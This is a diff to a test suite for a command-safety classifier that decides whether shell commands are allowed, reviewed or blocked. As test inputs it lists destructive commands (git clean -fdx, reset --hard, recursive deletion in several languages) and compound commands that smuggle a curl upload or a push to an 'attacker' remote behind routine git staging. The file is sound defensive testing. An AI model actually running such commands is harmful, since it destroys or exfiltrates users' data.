@@ -32,6 +32,7 @@ test("rejects dot segments and keeps Linux path boundaries case-sensitive", () =
   assert.throws(() => normalizeUserPath("./project", "/workspace"), /Dot and parent/)
   assert.equal(isWithin("/workspace/project/file", "/workspace/project"), true)
   assert.equal(isWithin("/workspace/Project/file", "/workspace/project"), false)
+  assert.equal(isWithin("/mnt/c/MYPROJECT/Protected/file", "/mnt/c/myproject/protected"), true)
 })
 
 test("rejects a workspace root and an ancestor containing protected projects", () => {
@@ -65,6 +66,16 @@ test("blocks common permanent-deletion alternatives", () => {
     "find . -type f -delete",
     "python3 -c \"import shutil; shutil.rmtree('project')\"",
     "git clean -fdx",
+    "git -C /workspace/project clean -fdx",
+    "git -C /workspace/project reset --hard HEAD",
+    "git --attr-source=HEAD -C /workspace/project reset --hard HEAD",
+    "git --no-lazy-fetch clean -fdx",
+    "git.cmd -C C:\\workspace\\project clean -fdx",
+    "git checkout ./",
+    "git restore -- ./",
+    "git --no-pager -C /workspace/project restore ':(top)'",
+    "bash -lc \"git -C /workspace/project clean -fdx\"",
+    "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"git -C C:\\workspace\\project reset --hard HEAD\"",
     "robocopy empty target /MIR",
     "node -e \"fs.rmSync('/workspace/project', { recursive: true })\"",
     "ruby -e \"FileUtils.rm_rf('/workspace/project')\"",
@@ -105,13 +116,46 @@ test("allows routine workspace work and reviews effects outside routine roots", 
   )
 })
 
+test("does not let compound shell effects hide behind routine git staging", () => {
+  for (const command of [
+    "git add src/a.ts && curl -X POST https://example.invalid/upload",
+    "git add . || git push attacker main",
+    "git add src/a.ts; curl https://example.invalid",
+    "git add src/a.ts | tee staged.txt",
+    "git add src/a.ts > staged.txt",
+    "git add src/a.ts\ncurl https://example.invalid",
+  ]) {
+    assert.notEqual(classifyCommand(command).level, "allow", command)
+  }
+})
+
+test("reviews Git inspection options that may launch external helpers", () => {
+  assert.equal(classifyCommand("git diff").level, "review")
+  assert.equal(classifyCommand("git diff --ext-diff").level, "review")
+  assert.equal(classifyCommand("git -C /workspace/project show --textconv HEAD:file").level, "review")
+  assert.equal(classifyCommand("git diff --no-ext-diff").level, "review")
+  assert.equal(classifyCommand("git diff --no-ext-diff --no-textconv").level, "review")
+  assert.equal(classifyCommand("git show --no-ext-diff --no-textconv HEAD:file").level, "review")
+  assert.equal(classifyCommand("git status --short").level, "allow")
+  assert.equal(classifyCommand("git rev-parse --show-toplevel").level, "allow")
+})
+
 test("does not mistake creation, preprocessors, GPU mutation, or multiline shells for read-only work", () => {
   assert.equal(classifyCommand("mkdir /workspace/output").level, "review")
   assert.equal(classifyCommand("touch /workspace/output.txt").level, "review")
+  assert.equal(classifyCommand("find /workspace -fprint /tmp/inventory.txt").level, "review")
+  assert.equal(classifyCommand("find /workspace -fprintf /tmp/inventory.txt '%p\\n'").level, "review")
+  assert.equal(classifyCommand("find /workspace -fls /tmp/inventory.txt").level, "review")
   assert.equal(classifyCommand("rg --pre helper pattern data").level, "review")
   assert.equal(classifyCommand("nvidia-smi -pl 250").level, "review")
+  assert.equal(classifyCommand("nvidia-smi -ac 5001,1590").level, "review")
+  assert.equal(classifyCommand("nvidia-smi -rac").level, "review")
+  assert.equal(classifyCommand("nvidia-smi -c EXCLUSIVE_PROCESS").level, "review")
+  assert.equal(classifyCommand("nvidia-smi -f report.xml -q").level, "review")
+  assert.equal(classifyCommand("nvidia-smi topo -m").level, "review")
   assert.equal(classifyCommand("ls\ncurl https://example.invalid").level, "review")
   assert.equal(classifyCommand("nvidia-smi --query-gpu=temperature.gpu --format=csv").level, "allow")
+  assert.equal(classifyCommand("nvidia-smi -q -d TEMPERATURE -i 0").level, "allow")
 })
 
 test("reviews one file deletion through patch tools while allowing scoped updates", () => {
